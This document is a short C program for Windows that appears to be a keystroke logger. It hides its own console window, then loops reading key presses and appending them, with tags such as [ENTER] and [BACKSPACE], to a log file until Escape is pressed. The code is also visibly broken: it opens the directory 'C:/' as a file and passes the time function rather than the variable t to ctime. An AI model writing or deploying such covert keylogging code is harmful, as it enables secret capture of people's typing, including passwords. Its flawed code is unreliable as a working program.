#include <stdio.h>
#include <curses.h>
#include <windows.h>
#include <time.h>

#define PATH "C:/"

int main(){
	char capture;
	FILE *file;

	time_t t;
	t = time(NULL);

	HWND window;
	AllocConsole();
	window=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(window,0);

	file = fopen(PATH, "a+");
	fprintf(file, "\n#$Logger: Started logging @ %s", ctime(&time));

	while(1) {
		sleep(20);
		if (kbhit()) {
			capture = getch();
			switch ((int)capture) {
				case ' ':
					fprintf(file, " ");
					break;
				case 0x09:
					fprintf(file, "[TAB]");
					break;
				case 0x0D:
					fprintf(file, "[ENTER]");
					break;
				case 0x1B:
					fprintf(file, "[ESC]");
					break;
				case 0x08:
					fprintf(file, "[BACKSPACE]");
					break;
				default:
					fputc(capture,file);
			}
			if ( (int) capture == 27 ) {
				fclose(file);
				return 0;
			}
		}
	}
}
